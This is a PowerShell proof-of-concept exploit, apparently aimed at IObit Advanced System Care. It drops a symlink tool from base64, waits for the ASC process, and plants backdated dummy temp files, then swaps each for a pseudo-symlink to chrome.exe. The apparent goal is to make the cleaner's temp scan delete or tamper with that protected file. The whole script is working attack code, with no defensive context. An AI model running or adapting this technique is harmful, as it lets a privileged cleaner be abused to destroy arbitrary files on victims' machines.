Clear-Host
# for symlink.exe - can be everywhere
Set-Location $env:USERPROFILE
# drop createsymlink.exe (upx compressed to keep file size low for this script)
$slexe= ""
[IO.File]::WriteAllBytes($env:USERPROFILE + "\createsymlink.exe", [Convert]::FromBase64String($slexe))
# target for symlink
$target = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
# amount of dummy files/symlinks
$numdummy = 100
Write-Host "Waiting for Advanced System Care process..."
# process check interval (every x seconds)
$checkinterval = 3


while($true){
# check if ASC is running
$ASC = Get-Process 'ASC' -ErrorAction SilentlyContinue

# If ASC is running
if ($ASC.WorkingSet -gt 1) {
 Write-Host "Advanced System Care running :)" -ForegroundColor Green
 for ($i=1; $i -le $numdummy; $i++)
{
# create dummy folder
New-Item ($env:TEMP + "\folder$i") -ItemType Directory >$null 2>&1
# write something into the file
"dummy text" | Out-File  ($env:TEMP + "\folder$i\dummy.log") >$null 2>&1
# modify timestamp that ASC recognize the file
$date = Get-Date "6/3/2019 11:31 AM"
Set-ItemProperty -Path ($env:TEMP + "\folder$i\dummy.log") -Name LastWriteTime -Value $date
# wait some time before removal to get the file recognized as temp file during BS scan
Start-Sleep -Milliseconds 800
Write-Host "`rCreating Pseudo-Symlink for dummy $i of $numdummy" -NoNewline
# remove folder - necessary for symlink creation
Remove-Item ($env:TEMP + "\folder$i") -Recurse -Force -ErrorAction SilentlyContinue >$null 2>&1
# create symlink after folder removal
#Start-Sleep -Milliseconds 50
.\CreateSymlink.exe -p ($env:TEMP + "\folder$i\dummy.log") $target  >$null 2>&1
}
Write-Host "Created $numdummy Pseudo-Symlinks to $target"
Write-Host "Exiting now"
 exit
}
Start-Sleep -Seconds $checkinterval
}
